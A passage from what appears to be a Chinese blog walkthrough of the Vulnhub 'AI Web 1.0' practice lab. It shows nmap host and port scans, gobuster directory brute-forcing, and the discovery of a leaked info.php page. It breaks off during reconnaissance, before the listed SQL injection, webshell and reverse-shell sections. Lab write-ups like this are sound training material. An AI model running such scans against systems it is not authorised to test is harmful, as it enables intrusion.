@@ -1,0 +1,937 @@
+<!doctype html><html lang=zh-cn dir=ltr><head><meta charset=utf-8><meta name=viewport content='width=device-width,initial-scale=1'><meta name=description content="这是大一组织打的第一个渗透靶场，现在重新打一遍"><title>AI Web 1.0 Vulunhub靶场复现-重走来时路</title><link rel=canonical href=https://ke1thli.github.io/p/ai-web-1.0-vulunhub%E9%9D%B6%E5%9C%BA%E5%A4%8D%E7%8E%B0-%E9%87%8D%E8%B5%B0%E6%9D%A5%E6%97%B6%E8%B7%AF/><link rel=preconnect href=https://fonts.googleapis.com><link rel=preconnect href=https://fonts.gstatic.com crossorigin><link rel=preload as=style href="https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap"><link rel=stylesheet href="https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap"><link rel=stylesheet href=/scss/style.min.389e156f5e9bb13df5a924cfa99dfb9c39f3e01e68d9e146cd65bdae963be145.css><meta property='og:title' content="AI Web 1.0 Vulunhub靶场复现-重走来时路"><meta property='og:description' content="这是大一组织打的第一个渗透靶场，现在重新打一遍"><meta property='og:url' content='https://ke1thli.github.io/p/ai-web-1.0-vulunhub%E9%9D%B6%E5%9C%BA%E5%A4%8D%E7%8E%B0-%E9%87%8D%E8%B5%B0%E6%9D%A5%E6%97%B6%E8%B7%AF/'><meta property='og:site_name' content='Ke1thLi 的技术笔记'><meta property='og:type' content='article'><meta property='article:section' content='Post'><meta property='article:tag' content='Vulnhub'><meta property='article:published_time' content='2026-07-11T00:00:00+00:00'><meta property='article:modified_time' content='2026-07-11T00:00:00+00:00'><meta name=twitter:title content="AI Web 1.0 Vulunhub靶场复现-重走来时路"><meta name=twitter:description content="这是大一组织打的第一个渗透靶场，现在重新打一遍"><link rel="shortcut icon" href=/img/favicon.png></head><body class=article-page><script>(function(){const e="StackColorScheme";localStorage.getItem(e)||localStorage.setItem(e,"auto")})()</script><script>(function(){const t="StackColorScheme",e=localStorage.getItem(t),n=window.matchMedia("(prefers-color-scheme: dark)").matches===!0;e=="dark"||e==="auto"&&n?document.documentElement.dataset.scheme="dark":document.documentElement.dataset.scheme="light"})()</script><div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky"><button class="hamburger hamburger--spin" type=button id=toggle-menu aria-label>
+<span class=hamburger-box><span class=hamburger-inner></span></span></button><header><figure class=site-avatar><a href=/><img src=/img/avatar.png width=640 height=640 class=site-logo loading=lazy alt=Avatar>
+</a><span class=emoji>🎓</span></figure><div class=site-meta><h1 class=site-name><a href=/>Ke1thLi 的技术笔记</a></h1><h2 class=site-description>The harder you work, the luckier you get</h2></div></header><ol class=menu-social><li><a href=https://github.com/Ke1thLi title=GitHub rel=me><svg class="icon icon-tabler icon-tabler-brand-github" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M9 19c-4.3 1.4-4.3-2.5-6-3m12 5v-3.5c0-1 .1-1.4-.5-2 2.8-.3 5.5-1.4 5.5-6a4.6 4.6.0 00-1.3-3.2 4.2 4.2.0 00-.1-3.2s-1.1-.3-3.5 1.3a12.3 12.3.0 00-6.2.0C6.5 2.8 5.4 3.1 5.4 3.1a4.2 4.2.0 00-.1 3.2A4.6 4.6.0 004 9.5c0 4.6 2.7 5.7 5.5 6-.6.6-.6 1.2-.5 2V21"/></svg></a></li></ol><ol class=menu id=main-menu><li><a href=/><svg class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><polyline points="5 12 3 12 12 3 21 12 19 12"/><path d="M5 12v7a2 2 0 002 2h10a2 2 0 002-2v-7"/><path d="M9 21v-6a2 2 0 012-2h2a2 2 0 012 2v6"/></svg>
+<span>Home</span></a></li><li><a href=/archives/><svg class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><rect x="3" y="4" width="18" height="4" rx="2"/><path d="M5 8v10a2 2 0 002 2h10a2 2 0 002-2V8"/><line x1="10" y1="12" x2="14" y2="12"/></svg>
+<span>Archives</span></a></li><li><a href=/search/><svg class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="10" cy="10" r="7"/><line x1="21" y1="21" x2="15" y2="15"/></svg>
+<span>Search</span></a></li><li><a href=/links/><svg class="icon icon-tabler icon-tabler-link" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><path d="M10 14a3.5 3.5.0 005 0l4-4a3.5 3.5.0 00-5-5l-.5.5"/><path d="M14 10a3.5 3.5.0 00-5 0l-4 4a3.5 3.5.0 005 5l.5-.5"/></svg>
+<span>Links</span></a></li><li class=menu-bottom-section><ol class=menu><li id=dark-mode-toggle><svg class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="8" cy="12" r="2"/><rect x="2" y="6" width="20" height="12" rx="6"/></svg>
+<svg class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="16" cy="12" r="2"/><rect x="2" y="6" width="20" height="12" rx="6"/></svg>
+<span></span></li></ol></li></ol></aside><aside class="sidebar right-sidebar sticky"><section class="widget archives"><div class=widget-icon><svg class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><line x1="5" y1="9" x2="19" y2="9"/><line x1="5" y1="15" x2="19" y2="15"/><line x1="11" y1="4" x2="7" y2="20"/><line x1="17" y1="4" x2="13" y2="20"/></svg></div><h2 class="widget-title section-title"></h2><div class=widget--toc><nav class=toc-nav id=TableOfContents><ol><li><a href=#主机发现>主机发现</a></li><li><a href=#端口扫描>端口扫描</a></li><li><a href=#目录爆破>目录爆破</a></li><li><a href=#信息泄露>信息泄露</a></li><li><a href=#sql-注入分析>SQL 注入分析</a></li><li><a href=#sqlmap利用>SQLMap利用</a></li><li><a href=#数据库脱库>数据库脱库</a></li><li><a href=#数据库信息收集>数据库信息收集</a></li><li><a href=#获取webshell>获取WebShell</a></li><li><a href=#反弹shell>反弹Shell</a></li><li><a href=#权限提升>权限提升</a></li><li><a href=#拿到flag>拿到flag</a></li><li><a href=#总结>总结</a></li></ol></nav></div></section></aside><main class="main full-width"><article class=main-article><header class=article-header><div class=article-details><div class=article-title-wrapper><h2 class=article-title><a href=/p/ai-web-1.0-vulunhub%E9%9D%B6%E5%9C%BA%E5%A4%8D%E7%8E%B0-%E9%87%8D%E8%B5%B0%E6%9D%A5%E6%97%B6%E8%B7%AF/>AI Web 1.0 Vulunhub靶场复现-重走来时路</a></h2><h3 class=article-subtitle>这是大一组织打的第一个渗透靶场，现在重新打一遍</h3></div><footer class=article-meta><div class=inline-meta><svg class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><path d="M11.795 21H5a2 2 0 01-2-2V7a2 2 0 012-2h12a2 2 0 012 2v4"/><circle cx="18" cy="18" r="4"/><path d="M15 3v4"/><path d="M7 3v4"/><path d="M3 11h16"/><path d="M18 16.496V18l1 1"/></svg>
+<time class=article-time--published datetime=2026-07-11T00:00:00Z>Saturday, July 11, 2026</time>
+<svg class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="12" r="9"/><polyline points="12 7 12 12 15 15"/></svg>
+<time class=article-time--reading></time></div></footer></div></header><aside class=article-toc><details><summary><div class=article-toc-title><svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-tabler icons-tabler-outline icon-tabler-chevron-right"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M9 6l6 6-6 6"/></svg>
+<span></span></div></summary><nav class=toc-nav><ol><li><a href=#主机发现>主机发现</a></li><li><a href=#端口扫描>端口扫描</a></li><li><a href=#目录爆破>目录爆破</a></li><li><a href=#信息泄露>信息泄露</a></li><li><a href=#sql-注入分析>SQL 注入分析</a></li><li><a href=#sqlmap利用>SQLMap利用</a></li><li><a href=#数据库脱库>数据库脱库</a></li><li><a href=#数据库信息收集>数据库信息收集</a></li><li><a href=#获取webshell>获取WebShell</a></li><li><a href=#反弹shell>反弹Shell</a></li><li><a href=#权限提升>权限提升</a></li><li><a href=#拿到flag>拿到flag</a></li><li><a href=#总结>总结</a></li></ol></nav></details></aside><section class=article-content><h1 id=ai-web-10-vulunhub靶场复现-重走来时路>AI Web 1.0 Vulunhub靶场复现-重走来时路</h1><h2 id=主机发现>主机发现</h2><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>┌──<span class=o>(</span>kali㉿kali<span class=o>)</span>-<span class=o>[</span>~<span class=o>]</span>
+</span></span><span class=line><span class=cl>└─$ sudo nmap -sn 10.10.10.0/24             
+</span></span><span class=line><span class=cl><span class=o>[</span>sudo<span class=o>]</span> kali 的密码：
+</span></span><span class=line><span class=cl>Starting Nmap 7.99 <span class=o>(</span> https://nmap.org <span class=o>)</span> at 2026-07-09 13:08 -0400
+</span></span><span class=line><span class=cl>Nmap scan report <span class=k>for</span> 10.10.10.1
+</span></span><span class=line><span class=cl>Host is up <span class=o>(</span>0.00035s latency<span class=o>)</span>.
+</span></span><span class=line><span class=cl>MAC Address: 00:50:56:C0:00:08 <span class=o>(</span>VMware<span class=o>)</span>
+</span></span><span class=line><span class=cl>Nmap scan report <span class=k>for</span> 10.10.10.2
+</span></span><span class=line><span class=cl>Host is up <span class=o>(</span>0.00018s latency<span class=o>)</span>.
+</span></span><span class=line><span class=cl>MAC Address: 00:50:56:F0:E1:42 <span class=o>(</span>VMware<span class=o>)</span>
+</span></span><span class=line><span class=cl>Nmap scan report <span class=k>for</span> 10.10.10.129
+</span></span><span class=line><span class=cl>Host is up <span class=o>(</span>0.00013s latency<span class=o>)</span>.
+</span></span><span class=line><span class=cl>MAC Address: 00:0C:29:52:0E:F1 <span class=o>(</span>VMware<span class=o>)</span>
+</span></span><span class=line><span class=cl>Nmap scan report <span class=k>for</span> 10.10.10.254
+</span></span><span class=line><span class=cl>Host is up <span class=o>(</span>0.00022s latency<span class=o>)</span>.
+</span></span><span class=line><span class=cl>MAC Address: 00:50:56:FD:4D:07 <span class=o>(</span>VMware<span class=o>)</span>
+</span></span><span class=line><span class=cl>Nmap scan report <span class=k>for</span> 10.10.10.10
+</span></span><span class=line><span class=cl>Host is up.
+</span></span><span class=line><span class=cl>Nmap <span class=k>done</span>: <span class=m>256</span> IP addresses <span class=o>(</span><span class=m>5</span> hosts up<span class=o>)</span> scanned in 7.44 seconds
+</span></span></code></pre></td></tr></table></div></div><p>命令讲解</p><p>-sn &mdash;>(no port scan) 无端口扫描 作用是仅对主机进行存活嗅探，不进行端口扫描</p><p>sudo 的作用</p><ol><li>发送<strong>原始数据包</strong>，组合使用多种探测技术进行扫描</li><li>会使用ICMP Echo请求、TCP SYN/ACK探测</li><li>高效，能绕过某些防火墙规则，但网络足迹更明显</li></ol><p>不加sudo的特点（不仅是权限的不同）</p><ol><li>使用系统<code>connect()</code>系统调用</li><li>TCP connect（）扫描</li><li>会建立完整的TCP三次握手，网络足迹更常规，类似普通网络连接</li></ol><h2 id=端口扫描>端口扫描</h2><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>┌──<span class=o>(</span>kali㉿kali<span class=o>)</span>-<span class=o>[</span>~/Labs/Vulnhub/AIWeb1<span class=o>]</span>
+</span></span><span class=line><span class=cl>└─$ sudo nmap -sT -sV -sC -O -p-  10.10.10.129 
+</span></span><span class=line><span class=cl>Starting Nmap 7.99 <span class=o>(</span> https://nmap.org <span class=o>)</span> at 2026-07-10 11:29 -0400
+</span></span><span class=line><span class=cl>Nmap scan report <span class=k>for</span> 10.10.10.129
+</span></span><span class=line><span class=cl>Host is up <span class=o>(</span>0.00061s latency<span class=o>)</span>.
+</span></span><span class=line><span class=cl>Not shown: <span class=m>65534</span> closed tcp ports <span class=o>(</span>conn-refused<span class=o>)</span>
+</span></span><span class=line><span class=cl>PORT   STATE SERVICE VERSION
+</span></span><span class=line><span class=cl>80/tcp open  http    Apache httpd
+</span></span><span class=line><span class=cl><span class=p>|</span> http-robots.txt: <span class=m>2</span> disallowed entries 
+</span></span><span class=line><span class=cl><span class=p>|</span>_/m3diNf0/ /se3reTdir777/uploads/
+</span></span><span class=line><span class=cl><span class=p>|</span>_http-server-header: Apache
+</span></span><span class=line><span class=cl><span class=p>|</span>_http-title: AI Web 1.0
+</span></span><span class=line><span class=cl>MAC Address: 00:0C:29:52:0E:F1 <span class=o>(</span>VMware<span class=o>)</span>
+</span></span><span class=line><span class=cl>Device type: general purpose
+</span></span><span class=line><span class=cl>Running: Linux 3.X<span class=p>|</span>4.X
+</span></span><span class=line><span class=cl>OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
+</span></span><span class=line><span class=cl>OS details: Linux 3.2 - 4.14
+</span></span><span class=line><span class=cl>Network Distance: <span class=m>1</span> hop
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+</span></span><span class=line><span class=cl>Nmap <span class=k>done</span>: <span class=m>1</span> IP address <span class=o>(</span><span class=m>1</span> host up<span class=o>)</span> scanned in 10.44 seconds
+</span></span></code></pre></td></tr></table></div></div><div class=table-wrapper><table><thead><tr><th>参数</th><th>作用</th></tr></thead><tbody><tr><td>-sT</td><td>TCP connect扫描</td></tr><tr><td>-sV</td><td>服务版本检测</td></tr><tr><td>-sC</td><td>默认脚本扫描</td></tr><tr><td>-O</td><td>操作系统识别</td></tr><tr><td>-p-</td><td>扫描所以65535端口</td></tr></tbody></table></div><p>获取到的信息</p><ol><li>仅80端口开放http协议</li><li>默认脚本扫出robots.txt中禁止爬取的两条路径，访问后均显示没有权限访问该页面</li></ol><h2 id=目录爆破>目录爆破</h2><p>访问80端口页面仅显示一句话Not even Google search my contents!<strong>连谷歌都搜不到我的内容！</strong></p><p>进行web 目录爆破</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span><span class=lnt>25
+</span><span class=lnt>26
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>┌──<span class=o>(</span>kali㉿kali<span class=o>)</span>-<span class=o>[</span>~/Labs/Vulnhub/AIWeb1<span class=o>]</span>
+</span></span><span class=line><span class=cl>└─$ gobuster dir -u 10.10.10.129 -w /usr/share/wordlists/dirb/common.txt
+</span></span><span class=line><span class=cl><span class=o>===============================================================</span>
+</span></span><span class=line><span class=cl>Gobuster v3.8.2
+</span></span><span class=line><span class=cl>by OJ Reeves <span class=o>(</span>@TheColonial<span class=o>)</span> <span class=p>&amp;</span> Christian Mehlmauer <span class=o>(</span>@firefart<span class=o>)</span>
+</span></span><span class=line><span class=cl><span class=o>===============================================================</span>
+</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Url:                     http://10.10.10.129
+</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Method:                  GET
+</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Threads:                 <span class=m>10</span>
+</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Wordlist:                /usr/share/wordlists/dirb/common.txt
+</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Negative Status codes:   <span class=m>404</span>
+</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> User Agent:              gobuster/3.8.2
+</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Timeout:                 <span class=nv>10s</span>
+</span></span><span class=line><span class=cl><span class=o>===============================================================</span>
+</span></span><span class=line><span class=cl>Starting gobuster in directory enumeration <span class=nv>mode</span>
+</span></span><span class=line><span class=cl><span class=o>===============================================================</span>
+</span></span><span class=line><span class=cl>.htpasswd            <span class=o>(</span>Status: 403<span class=o>)</span> <span class=o>[</span>Size: 218<span class=o>]</span>
+</span></span><span class=line><span class=cl>.htaccess            <span class=o>(</span>Status: 403<span class=o>)</span> <span class=o>[</span>Size: 218<span class=o>]</span>
+</span></span><span class=line><span class=cl>.hta                 <span class=o>(</span>Status: 403<span class=o>)</span> <span class=o>[</span>Size: 213<span class=o>]</span>
+</span></span><span class=line><span class=cl>index.html           <span class=o>(</span>Status: 200<span class=o>)</span> <span class=o>[</span>Size: 141<span class=o>]</span>
+</span></span><span class=line><span class=cl>robots.txt           <span class=o>(</span>Status: 200<span class=o>)</span> <span class=o>[</span>Size: 82<span class=o>]</span>
+</span></span><span class=line><span class=cl>server-status        <span class=o>(</span>Status: 403<span class=o>)</span> <span class=o>[</span>Size: 222<span class=o>]</span>
+</span></span><span class=line><span class=cl>Progress: <span class=m>4613</span> / <span class=m>4613</span> <span class=o>(</span>100.00%<span class=o>)</span>
+</span></span><span class=line><span class=cl><span class=o>===============================================================</span>
+</span></span><span class=line><span class=cl><span class=nv>Finished</span>
+</span></span><span class=line><span class=cl><span class=o>===============================================================</span>
+</span></span></code></pre></td></tr></table></div></div><p>没什么用</p><p>那就再爆破给的两个路径</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>┌──<span class=o>(</span>kali㉿kali<span class=o>)</span>-<span class=o>[</span>~/Labs/Vulnhub/AIWeb1<span class=o>]</span>
+</span></span><span class=line><span class=cl>└─$ gobuster dir -u 10.10.10.129/m3diNf0 -w /usr/share/wordlists/dirb/common.txt 
+</span></span><span class=line><span class=cl><span class=o>===============================================================</span>
+</span></span><span class=line><span class=cl>Gobuster v3.8.2
+</span></span><span class=line><span class=cl>by OJ Reeves <span class=o>(</span>@TheColonial<span class=o>)</span> <span class=p>&amp;</span> Christian Mehlmauer <span class=o>(</span>@firefart<span class=o>)</span>
+</span></span><span class=line><span class=cl><span class=o>===============================================================</span>
+</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Url:                     http://10.10.10.129/m3diNf0
+</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Method:                  GET
+</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Threads:                 <span class=m>10</span>
+</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Wordlist:                /usr/share/wordlists/dirb/common.txt
+</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Negative Status codes:   <span class=m>404</span>
+</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> User Agent:              gobuster/3.8.2
+</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Timeout:                 <span class=nv>10s</span>
+</span></span><span class=line><span class=cl><span class=o>===============================================================</span>
+</span></span><span class=line><span class=cl>Starting gobuster in directory enumeration <span class=nv>mode</span>
+</span></span><span class=line><span class=cl><span class=o>===============================================================</span>
+</span></span><span class=line><span class=cl>.hta                 <span class=o>(</span>Status: 403<span class=o>)</span> <span class=o>[</span>Size: 221<span class=o>]</span>
+</span></span><span class=line><span class=cl>.htpasswd            <span class=o>(</span>Status: 403<span class=o>)</span> <span class=o>[</span>Size: 226<span class=o>]</span>
+</span></span><span class=line><span class=cl>.htaccess            <span class=o>(</span>Status: 403<span class=o>)</span> <span class=o>[</span>Size: 226<span class=o>]</span>
+</span></span><span class=line><span class=cl>info.php             <span class=o>(</span>Status: 200<span class=o>)</span> <span class=o>[</span>Size: 84168<span class=o>]</span>
+</span></span><span class=line><span class=cl>Progress: <span class=m>4613</span> / <span class=m>4613</span> <span class=o>(</span>100.00%<span class=o>)</span>
+</span></span><span class=line><span class=cl><span class=o>===============================================================</span>
+</span></span><span class=line><span class=cl><span class=nv>Finished</span>
+</span></span><span class=line><span class=cl><span class=o>===============================================================</span>
+</span></span></code></pre></td></tr></table></div></div><p>暴露出来了info.php 路径</p><h2 id=信息泄露>信息泄露</h2><p>这个路径是干什么的？</p><p>会将当前服务器环境的所有配置细节一股脑地打印出来</p><p>访问得到
+DOCUMENT_ROOT = /home/www/html/web1x443290o2sdf92213
+为后续漏洞利用做铺垫</p><p>继续爆破</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>┌──<span class=o>(</span>kali㉿kali<span class=o>)</span>-<span class=o>[</span>~/Labs/Vulnhub/AIWeb1<span class=o>]</span>
+</span></span><span class=line><span class=cl>└─$ gobuster dir -u 10.10.10.129/se3reTdir777/uploads/ -w /usr/share/wordlists/dirb/common.txt 
+</span></span><span class=line><span class=cl><span class=o>===============================================================</span>
+</span></span><span class=line><span class=cl>Gobuster v3.8.2
+</span></span><span class=line><span class=cl>by OJ Reeves <span class=o>(</span>@TheColonial<span class=o>)</span> <span class=p>&amp;</span> Christian Mehlmauer <span class=o>(</span>@firefart<span class=o>)</span>
+</span></span><span class=line><span class=cl><span class=o>===============================================================</span>
+</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Url:                     http://10.10.10.129/se3reTdir777/uploads/
+</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Method:                  GET
+</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Threads:                 <span class=m>10</span>
+</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Wordlist:                /usr/share/wordlists/dirb/common.txt
+</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Negative Status codes:   <span class=m>404</span>
+</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> User Agent:              gobuster/3.8.2
+</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Timeout:                 <span class=nv>10s</span>
+</span></span><span class=line><span class=cl><span class=o>===============================================================</span>
+</span></span><span class=line><span class=cl>Starting gobuster in directory enumeration <span class=nv>mode</span>
+</span></span><span class=line><span class=cl><span class=o>===============================================================</span>
+</span></span><span class=line><span class=cl>.hta                 <span class=o>(</span>Status: 403<span class=o>)</span> <span class=o>[</span>Size: 234<span class=o>]</span>
+</span></span><span class=line><span class=cl>.htpasswd            <span class=o>(</span>Status: 403<span class=o>)</span> <span class=o>[</span>Size: 239<span class=o>]</span>
+</span></span><span class=line><span class=cl>.htaccess            <span class=o>(</span>Status: 403<span class=o>)</span> <span class=o>[</span>Size: 239<span class=o>]</span>
+</span></span><span class=line><span class=cl>Progress: <span class=m>4613</span> / <span class=m>4613</span> <span class=o>(</span>100.00%<span class=o>)</span>
+</span></span><span class=line><span class=cl><span class=o>===============================================================</span>
+</span></span><span class=line><span class=cl><span class=nv>Finished</span>
+</span></span><span class=line><span class=cl><span class=o>===============================================================</span>
+</span></span></code></pre></td></tr></table></div></div><p>啥也没有</p><p>扫描父目录</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span><span class=lnt>25
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>┌──<span class=o>(</span>kali㉿kali<span class=o>)</span>-<span class=o>[</span>~/Labs/Vulnhub/AIWeb1<span class=o>]</span>
+</span></span><span class=line><span class=cl>└─$ gobuster dir -u 10.10.10.129/se3reTdir777 -w /usr/share/wordlists/dirb/common.txt 
+</span></span><span class=line><span class=cl><span class=o>===============================================================</span>
+</span></span><span class=line><span class=cl>Gobuster v3.8.2
+</span></span><span class=line><span class=cl>by OJ Reeves <span class=o>(</span>@TheColonial<span class=o>)</span> <span class=p>&amp;</span> Christian Mehlmauer <span class=o>(</span>@firefart<span class=o>)</span>
+</span></span><span class=line><span class=cl><span class=o>===============================================================</span>
+</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Url:                     http://10.10.10.129/se3reTdir777
+</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Method:                  GET
+</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Threads:                 <span class=m>10</span>
+</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Wordlist:                /usr/share/wordlists/dirb/common.txt
+</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Negative Status codes:   <span class=m>404</span>
+</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> User Agent:              gobuster/3.8.2
+</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Timeout:                 <span class=nv>10s</span>
+</span></span><span class=line><span class=cl><span class=o>===============================================================</span>
